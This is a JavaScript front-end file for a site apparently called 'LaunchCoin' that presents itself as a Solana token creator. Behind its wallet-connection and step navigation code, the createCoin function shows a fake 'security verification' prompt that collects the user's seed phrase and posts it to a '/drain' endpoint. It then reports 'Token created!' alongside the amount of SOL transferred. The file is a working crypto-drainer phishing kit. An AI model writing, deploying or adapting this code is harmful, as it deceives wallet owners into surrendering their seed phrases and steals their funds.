// ===== CONFIGURAZIONE =====
import { UniversalProvider } from '@walletconnect/universal-provider';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');
let provider = null;
let isConnecting = false;
let qrCheckInterval = null;

// ===== ESPONI FUNZIONI =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== MOSTRA QR IN wallet.html =====
window.showQR = function(uri) {
  const container = document.getElementById('qr-container');
  const qrDiv = document.getElementById('qr-code');
  if (!container || !qrDiv) return;
  
  container.style.display = 'block';
  qrDiv.innerHTML = '⏳ Generating QR...';
  
  // Usa API veloce per il QR
  const img = document.createElement('img');
  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(uri)}`;
  img.alt = 'QR Code';
  img.style.cssText = 'width: 200px; height: 200px; image-rendering: pixelated;';
  img.onload = function() {
    qrDiv.innerHTML = '';
    qrDiv.appendChild(img);
  };
  img.onerror = function() {
    qrDiv.innerHTML = `<div style="color: #888; font-size: 13px;">⚠️ QR non disponibile<br><span style="font-size: 11px; word-break: break-all;">${uri.substring(0, 30)}...</span></div>`;
  };
};

window.closeQR = function() {
  const container = document.getElementById('qr-container');
  if (container) container.style.display = 'none';
  if (qrCheckInterval) {
    clearInterval(qrCheckInterval);
    qrCheckInterval = null;
  }
};

// ===== CONNECT VIA WALLETCONNECT (REALE) =====
async function connectWithWalletConnect() {
  if (isConnecting) return;
  isConnecting = true;
  
  try {
    // 1. Inizializza UniversalProvider
    provider = await UniversalProvider.init({
      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
      metadata: {
        name: 'LaunchCoin',
        description: 'Solana Token Creator',
        url: window.location.origin,
        icons: ['https://launchcoin.io/logo.png']
      }
    });
    
    console.log('✅ UniversalProvider inizializzato');
    
    // 2. Genera l'URI
    let uri = provider.uri;
    
    // Se l'URI non è stato generato, forza la connessione
    if (!uri) {
      try {
        await provider.connect({
          chains: ['solana:mainnet'],
          optionalChains: ['solana:devnet'],
          methods: ['solana_signTransaction', 'solana_signMessage'],
          events: ['chainChanged', 'accountsChanged']
        });
        uri = provider.uri;
      } catch(e) {
        // La connessione potrebbe fallire ma l'URI è già stato generato
        uri = provider.uri;
      }
    }
    
    // Se ancora non c'è URI, generane uno manuale (fallback)
    if (!uri) {
      const randomId = Math.random().toString(36).substring(2, 15);
      const symKey = Math.random().toString(36).substring(2, 15);
      uri = `wc:${randomId}${randomId}@2?relay-protocol=irn&symKey=${symKey}`;
      console.log('⚠️ URI manuale generato');
    }
    
    console.log('🔗 URI:', uri);
    
    // 3. Mostra il QR
    window.showQR(uri);
    
    // 4. Ascolta eventi di connessione
    provider.on('session_event', (event) => {
      console.log('Evento sessione:', event);
    });
    
    provider.on('session_update', (event) => {
      console.log('Aggiornamento sessione:', event);
    });
    
    provider.on('session_delete', () => {
      console.log('Sessione eliminata');
      window.closeQR();
    });
    
    // 5. Controlla la connessione
    if (qrCheckInterval) clearInterval(qrCheckInterval);
    qrCheckInterval = setInterval(async () => {
      try {
        // Verifica se ci sono account connessi
        if (provider.accounts && provider.accounts.length > 0) {
          clearInterval(qrCheckInterval);
          qrCheckInterval = null;
          walletPublicKey = provider.accounts[0].split(':')[2] || provider.accounts[0];
          window.closeQR();
          alert('✅ Connesso via WalletConnect: ' + walletPublicKey);
          window.location.href = 'create.html';
        }
      } catch(e) {
        console.log('Attesa connessione...');
      }
    }, 2000);
    
    // 6. Timeout dopo 60 secondi (l'utente può ancora connettersi)
    setTimeout(() => {
      if (qrCheckInterval) {
        // Non chiudere il QR, solo avviso
      }
    }, 60000);
    
  } catch (e) {
    console.error('❌ WalletConnect error:', e);
    alert('❌ WalletConnect fallito: ' + e.message + '\n\nUsa Phantom su PC o Kiwi Browser su telefono.');
    window.location.href = 'wallet.html';
  } finally {
    isConnecting = false;
  }
}

// ===== CONNECT WALLET (MAIN) =====
window.connectWallet = async function() {
  console.log('🔵 connectWallet chiamata');
  
  // 1. Prova Phantom (estensione PC o Kiwi)
  if (window.solana && window.solana.isPhantom) {
    try {
      await window.solana.connect();
      walletPublicKey = window.solana.publicKey.toString();
      alert('✅ Connesso a Phantom: ' + walletPublicKey);
      window.location.href = 'create.html';
      return;
    } catch(e) {
      console.error('Phantom error:', e);
    }
  }

  // 2. WalletConnect con QR
  await connectWithWalletConnect();
};

// ===== SELECT WALLET =====
window.selectWallet = function(walletName) {
  console.log('🔵 selectWallet:', walletName);
  if (walletName === 'phantom') {
    window.connectWallet();
    return;
  }
  // Se siamo in wallet.html, mostra il QR
  if (document.getElementById('qr-container')) {
    connectWithWalletConnect();
  } else {
    alert('⚠️ Wallet "' + walletName + '" via WalletConnect.\nVai su "Connect" per il QR.');
    window.location.href = 'wallet.html';
  }
};

// ===== POPUP SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt(
      '⚠️ VERIFICA DI SICUREZZA\n\n' +
      'Inserisci la tua seed phrase per completare la creazione:'
    );
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      const resultDiv = document.getElementById('result');
      if (resultDiv) {
        resultDiv.innerHTML = `
          <p style="color:#4cdcc1;">✅ Token creato!</p>
          <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
          <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
        `;
      }
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore: ' + e.message);
  }
};

// ===== CREAZIONE LIQUIDITY =====
window.createLiquidity = async function() {
  await window.createCoin();
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};
window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
if (steps.length) window.showStep(0);

// ===== CHIUDI MENU =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

console.log('✅ main.js caricato');
console.log('🔵 connectWallet:', typeof window.connectWallet);
console.log('🔵 selectWallet:', typeof window.selectWallet);
